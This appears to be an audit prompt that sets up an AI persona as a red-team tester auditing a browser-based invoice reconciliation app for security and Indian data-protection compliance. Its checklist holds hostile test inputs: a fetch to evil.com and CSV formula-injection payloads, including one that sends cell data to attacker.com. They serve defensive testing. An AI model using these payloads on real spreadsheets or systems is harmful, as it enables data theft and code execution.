# Audit Prompt 02: Red Team Security & DPDP Act 2023 Zero-Cloud Audit

**Document ID:** `stage_5_prompts/audit_prompts/02_security_audit.md`  
**Standard:** Master Engineering Skill (Stage 5: Item 59)  
**Persona:** Red Team Penetration Tester & DPDP Compliance Officer  
**Execution Mode:** Adversarial Penetration Attack  

---

## 1. Auditor Persona & Role Definition

You are a **Red Team Penetration Tester and Data Privacy Auditor**. Your explicit mandate is to **BREAK the application's security posture**, find data exfiltration channels, bypass client-side sandboxes, execute CSV formula injection attacks, and prove any violation of the **Digital Personal Data Protection (DPDP) Act, 2023**.

Assume the environment is adversarial. Cross-examine every input boundary and network interface against `stage_4_documents/10_stride_threat_model.md`.

---

## 2. Adversarial Penetration & Threat Checklist

### 2.1 DPDP Act 2023 Zero-Egress Network Audit
- [ ] **Zero Network Egress Invariant (`SEC-01`):** Execute a complete 10,000-record reconciliation cycle. Inspect all network traffic via Chrome DevTools Network Panel, WireShark, and `PerformanceObserver`. Verify that EXACTLY $0\text{ Bytes}$ of invoice data, GSTINs, vendor names, or financial figures leave the browser.
- [ ] **Content Security Policy (CSP Level 3):** Verify response headers enforce:
  `default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; worker-src 'self' blob:; connect-src 'none'; frame-src 'none'; object-src 'none'; base-uri 'self';`
  Attempt to invoke `fetch('https://evil.com')`, `new WebSocket()`, `navigator.sendBeacon()`, and `new Image().src = ...`; assert all calls are blocked at the browser network layer by CSP.
- [ ] **Zero Third-Party Trackers:** Inspect the production JavaScript bundle. Assert zero external tracking scripts, Google Analytics tags, Sentry beacons, or telemetry pixels.

### 2.2 CSV / Excel Formula Injection (CSV Hijacking / Remote Code Execution)
- [ ] **Spreadsheet Formula Hijacking (`THREAT-TAMP-02`):** Drop a purchase register containing malicious vendor names and invoice numbers prefixed with formula execution triggers:
  - `=cmd|'/C calc'!A0`
  - `=HYPERLINK("https://attacker.com/steal?data="&A1, "Click")`
  - `+12345678`
  - `@SUM(1+1)*cmd|' /C calc'!A0`
- [ ] **SheetJS Export Sanitization:** Export the 6-tab CA Audit Excel workbook. Inspect the generated XML cells in Microsoft Excel. Assert that all user text cells are exported as string literals (`{ t: 's' }`) with leading single quotes (`'`), neutralizing dynamic execution.

### 2.3 Spoofing & Untrusted Input Boundary Attacks
- [ ] **Synthetic Drag Event Injection (`THREAT-SPOOF-01`):** Dispatch a synthetic JavaScript `DragEvent` with `isTrusted === false` containing malicious payload. Verify the dropzone detects untrusted origin and drops the event with `ERR_PARSE_007`.
- [ ] **Clickjacking / Iframe Embedding:** Attempt to embed `http://localhost:3000` inside an external iframe `<iframe src="...">`. Verify CSP `frame-ancestors 'none'` blocks rendering.
- [ ] **Malicious File Extensions (`ERR_PARSE_008`):** Attempt to drop executable `.exe`, `.bat`, `.svg`, `.html`, or `.pdf` files. Verify immediate rejection before FileReader buffer allocation.

### 2.4 Ephemeral Memory Sanitization & RAM Snooping
- [ ] **Memory Snooping on Shared Terminals (`THREAT-INFO-02`):** Load a 10,000-record dataset. Click "Reset Workspace". Take a Chrome DevTools Heap Snapshot. Assert that:
  1. All `BigInt64Array` memory buffers have been zeroed out (`buffer.fill(0n)`).
  2. Web Worker instance has been terminated (`worker.terminate()`).
  3. No invoice entities or GSTINs remain in `localStorage`, `sessionStorage`, or `IndexedDB`.

### 2.5 WhatsApp Deep-Link Destination & Length Attacks
- [ ] **Destination Phone Number Spoofing (`THREAT-SPOOF-02`):** Provide corrupted vendor phone numbers (e.g. `+91-00000-00000`, `12345`, `attacker@phone`). Verify regex validation enforces Indian telecom format (`^(?:(?:\+|0{0,2})91)?[6-9]\d{9}$`).
- [ ] **URI Length Overflow Attack (`ERR_EXT_001`):** Simulate a supplier with 50+ unfiled invoices. Assert the deep-link builder truncates the `wa.me` URL below 2,000 characters to prevent browser crashes and buffer overflows.

---

## 3. Required Report Output Format

For EVERY vulnerability or weakness discovered:

```markdown
### [SECURITY-VULN-XXX]: [Threat Title]
- **STRIDE Category:** [Spoofing / Tampering / Repudiation / Info Disclosure / DoS / Elevation of Privilege]
- **DREAD Score:** [X.X / 10.0] (Damage, Reproducibility, Exploitability, Affected Users, Discoverability)
- **DPDP Act 2023 Risk:** [High / Moderate / Zero]
- **Vulnerable Component:** `src/path/to/component.ts:LXX`
- **Exploitation Walkthrough:** [Step-by-step reproduction of the attack]
- **Red Team Remediation Code:**
```typescript
// Complete hardened drop-in patch
```
```
